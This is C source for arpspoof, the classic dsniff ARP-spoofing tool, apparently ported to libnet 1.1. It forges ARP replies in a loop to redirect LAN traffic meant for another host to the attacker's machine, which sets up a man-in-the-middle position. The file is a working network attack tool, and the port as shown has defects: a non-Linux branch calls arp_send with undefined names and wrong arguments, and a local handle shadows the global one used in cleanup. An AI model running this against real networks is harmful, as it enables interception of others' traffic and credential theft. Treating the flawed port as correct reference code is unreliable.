/*
  arpspoof.c

  Redirect packets from a target host (or from all hosts) intended for
  another host on the LAN to ourselves.
  
  Copyright (c) 1999 Dug Song <dugsong@monkey.org>

  $Id: arpspoof.c,v 1.3 2000/09/21 03:04:41 dugsong Exp $
*/

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "version.h"

extern char *ether_ntoa(struct libnet_ether_addr *);
extern int arp_cache_lookup(in_addr_t, struct libnet_ether_addr *);

static libnet_t *l;
static struct libnet_ether_addr spoof_mac, target_mac;
static in_addr_t spoof_ip, target_ip;

void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-i interface] [-t target] host\n");
	exit(1);
}

int
arp_send(libnet_t *l, int op,
    u_int8_t *sha, in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
{
  int ret = -1;

	if (sha == NULL
    && (sha = (u_char *)libnet_get_hwaddr(l)) == NULL) {
		return ret;
	}

	if (spa == 0) {
		if ((spa = libnet_get_ipaddr4(l)) == 0)
			return ret;
		spa = htonl(spa); /* XXX */
	}

	if (tha == NULL)
		tha = (u_int8_t*)"\xff\xff\xff\xff\xff\xff";
	

  libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4,
      op, sha, (u_int8_t*)&spa, tha, (u_int8_t*)&tpa,
      NULL, 0, l, 0);

  libnet_build_ethernet(tha, sha, ETHERTYPE_ARP,
      NULL, 0, l, 0);

	fprintf(stderr, "%s ",
		ether_ntoa((struct libnet_ether_addr *)sha));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct libnet_ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	} else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct libnet_ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct libnet_ether_addr *)sha));
	}

  ret = libnet_write(l);
  libnet_clear_packet(l);

  return ret;
}

#ifdef __linux__
int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

int
arp_find(in_addr_t ip, struct libnet_ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
    /* TODO:
     * fix the non-linux arp_send.
     */
		arp_send(llif, intf, ARPOP_REQUEST, NULL, 0, NULL, ip);
#endif
		sleep(1);
	}
	while (i++ < 3);

	return (0);
}

void
cleanup(int sig)
{
	int i;
  (void) sig;
	
	if (arp_find(spoof_ip, &spoof_mac)) {
		for (i = 0; i < 3; i++) {
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			arp_send(l, ARPOP_REPLY,
				 (u_char *)&spoof_mac, spoof_ip,
				 (target_ip ? (u_char *)&target_mac : NULL),
				 target_ip);
			sleep(1);
		}
	}
  libnet_destroy(l);
	exit(0);
}

int
main(int argc, char *argv[])
{
	int c;
  libnet_t *l;
  char *intf, *target;
	char pebuf[PCAP_ERRBUF_SIZE];
  char nebuf[LIBNET_ERRBUF_SIZE];
	
  target = NULL;
	intf = NULL;
	spoof_ip = target_ip = 0;

	while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 't':
      target = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();
	
	if (intf == NULL && (intf = pcap_lookupdev(pebuf)) == NULL)
		errx(1, "%s", pebuf);

  if ((l = libnet_init(LIBNET_LINK, intf, nebuf)) == NULL) {
    errx(1, "%s", nebuf);
  }
	
	if ((spoof_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == (u_int32_t)-1)
		usage();

  if (target != NULL && (target_ip = libnet_name2addr4(l, target, LIBNET_RESOLVE)) == (u_int32_t)-1)
    usage();
	
	if (target_ip != 0 && !arp_find(target_ip, &target_mac))
		errx(1, "couldn't arp for host %s",
		     libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
	
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
	
	for (;;) {
		arp_send(l, ARPOP_REPLY, NULL, spoof_ip,
			 (target_ip ? (u_int8_t*)&target_mac : NULL),
			 target_ip);
		sleep(2);
	}
	/* NOTREACHED */
	
	exit(0);
}
